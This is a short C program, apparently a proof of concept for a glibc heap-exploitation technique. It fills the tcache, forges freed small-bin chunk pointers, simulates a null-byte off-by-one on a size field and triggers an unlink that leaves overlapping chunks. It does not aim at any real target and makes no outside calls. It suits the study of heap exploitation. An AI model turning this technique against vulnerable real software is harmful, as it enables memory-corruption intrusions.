#include <stdio.h>
#include <stdlib.h>

void setbufs()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);

}

int main()
{
	void *p1,*p2,*p3,*p4,*p5;
	void *p6,*p7,*p8,*p9,*p0;
	void *p;
	long long*ptr;

	setbufs();

	p0=malloc(0xf8);
	p1=malloc(0xf8);
	p2=malloc(0xf8);
	p3=malloc(0xf8);
	p4=malloc(0xf8);
	p5=malloc(0xf8);
	p6=malloc(0xf8);
	p7=malloc(0xf8);
	p8=malloc(0xf8);
	p9=malloc(0xf8);

	free(p1);
	free(p3);
	free(p4);
	free(p5);
	free(p6);
	free(p7);
	free(p9); // now the tcache structure is full

	free(p8); // there will be freed to smallbin link
	free(p2);
	free(p0);

	p9=malloc(0xf8);
	p7=malloc(0xf8);
	p6=malloc(0xf8);
	p5=malloc(0xf8);
	p4=malloc(0xf8);
	p3=malloc(0xf8); // trigger it
	p1=malloc(0xf8); 

	puts("watch");
	p0=malloc(0xf8);
	ptr=(long long*)p0; // fake freed smallbin0
	*ptr=*ptr-0x10;

	p2=malloc(0xf8);
	ptr=(long long*)p2; // fake freed smallbin2
	*ptr=*ptr-0x10;



	ptr=(long long)p2+0xf0;
	*(ptr+1)=0x100;	// simulate a 'null byte off by one'

	free(p9);
	free(p7);
	free(p6);
	free(p5);
	free(p4); // free some chunks casually

	free(p1); // here tcache structure is full
	free(p3); // unlink here and we hava chunk overlapped







	return 0;
}
